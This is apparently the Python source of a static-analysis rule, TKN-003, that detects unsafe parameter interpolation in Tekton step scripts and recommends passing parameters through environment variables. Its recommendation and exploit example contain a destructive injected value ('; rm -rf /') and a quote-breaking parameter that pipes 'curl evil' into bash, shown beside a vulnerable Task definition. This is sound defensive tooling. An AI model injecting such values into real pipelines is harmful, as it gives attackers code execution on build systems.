"""TKN-003. Param interpolation in step ``script:`` is unsafe."""
from __future__ import annotations

import re

from ...base import Finding, Severity
from ...rule import Rule
from ..base import TektonContext, iter_step_scripts

RULE = Rule(
    id="TKN-003",
    title="Tekton param interpolated unsafely in step script",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-1"),
    esf=("ESF-D-CODE-INTEGRITY",),
    cwe=("CWE-78",),
    recommendation=(
        "Don't interpolate ``$(params.<name>)`` directly into the step "
        "``script:``. Tekton substitutes the value before the shell "
        "parses it, so a parameter containing ``; rm -rf /`` runs as "
        "shell. Receive the parameter through ``env:`` "
        "(``valueFrom: ...`` or ``value: $(params.<name>)``) and "
        "reference the env var quoted in the script "
        "(``\"$NAME\"``); or pass it as a positional argument to a "
        "shell function."
    ),
    docs_note=(
        "Fires on any ``$(params.X)`` or ``$(workspaces.X.path)`` "
        "token inside a ``script:`` body. Tekton substitutes the value "
        "into the script text before the shell parses it, so wrapping "
        "the token in double quotes does NOT help: an attacker value "
        "containing a ``\"`` closes the quote and the rest runs as "
        "shell. Only the env-var indirection pattern (bind the param "
        "via ``env:`` then reference the shell variable quoted, "
        "``\"$NAME\"``) is safe, and the rule doesn't fire on that."
    ),
    exploit_example=(
        "# Vulnerable: ``$(params.revision)`` is substituted into\n"
        "# the script literally before the shell parses it. A\n"
        "# PipelineRun whose ``revision`` param is\n"
        "# ``main\";curl evil|bash;\"`` executes the injected curl\n"
        "# in the step's shell context.\n"
        "apiVersion: tekton.dev/v1\n"
        "kind: Task\n"
        "metadata: { name: clone }\n"
        "spec:\n"
        "  params:\n"
        "    - name: revision\n"
        "      type: string\n"
        "  steps:\n"
        "    - name: clone\n"
        "      image: alpine/git@sha256:abc123...\n"
        "      script: |\n"
        "        git clone https://github.com/org/repo --branch $(params.revision)\n"
        "\n"
        "# Safe: bind the param to a shell variable via ``env`` and\n"
        "# quote it on every use. Tekton expands ``$(params.*)`` at\n"
        "# template time; shell quoting defends only at the shell\n"
        "# layer, so the indirection through env is what matters.\n"
        "apiVersion: tekton.dev/v1\n"
        "kind: Task\n"
        "metadata: { name: clone }\n"
        "spec:\n"
        "  params:\n"
        "    - name: revision\n"
        "      type: string\n"
        "  steps:\n"
        "    - name: clone\n"
        "      image: alpine/git@sha256:abc123...\n"
        "      env:\n"
        "        - name: REVISION\n"
        "          value: $(params.revision)\n"
        "      script: |\n"
        "        git clone https://github.com/org/repo --branch \"$REVISION\""
    ),
)

# Any ``$(params.X)`` / ``$(workspaces.X.path)`` token in a script body.
# Tekton expands these into the script text BEFORE the shell parses it,
# so quoting in the template (``"$(params.X)"``) does not protect against
# an attacker value that contains a closing quote. Every direct
# interpolation into a script is therefore unsafe; the safe pattern is
# env-var indirection, which carries no ``$(params.X)`` token in the
# script (it references a shell variable instead).
_PARAM_RE = re.compile(
    r"\$\(params\.[A-Za-z0-9_-]+\)"
    r"|\$\(workspaces\.[A-Za-z0-9_-]+\.path\)"
)


def check(ctx: TektonContext) -> Finding:
    offenders: list[str] = []
    # Per-step anchor in the form ``<Kind>/<name>:<step>`` so AC-023
    # can intersect with TKN-002's anchors and confirm the unsafe
    # param interpolation lands in the same step that runs
    # privileged. Order-preserving dict for reproducibility.
    anchor_steps: dict[str, None] = {}
    examined = 0
    for doc in ctx.docs:
        if doc.kind not in ("Task", "ClusterTask"):
            continue
        examined += 1
        for sname, script in iter_step_scripts(doc):
            m = _PARAM_RE.search(script)
            if m is not None:
                offenders.append(
                    f"{doc.kind}/{doc.name} {sname}: {m.group(0)}"
                )
                anchor_steps[f"{doc.kind}/{doc.name}:{sname}"] = None
    if examined == 0:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="tekton",
            description="No Task / ClusterTask documents to check.",
            recommendation="No action required.", passed=True,
        )
    passed = not offenders
    desc = (
        "No unsafe param interpolation in step scripts."
        if passed else
        f"{len(offenders)} step script(s) interpolate params unquoted: "
        f"{'; '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource="tekton", description=desc,
        recommendation=RULE.recommendation, passed=passed,
        job_anchors=tuple(anchor_steps),
    )
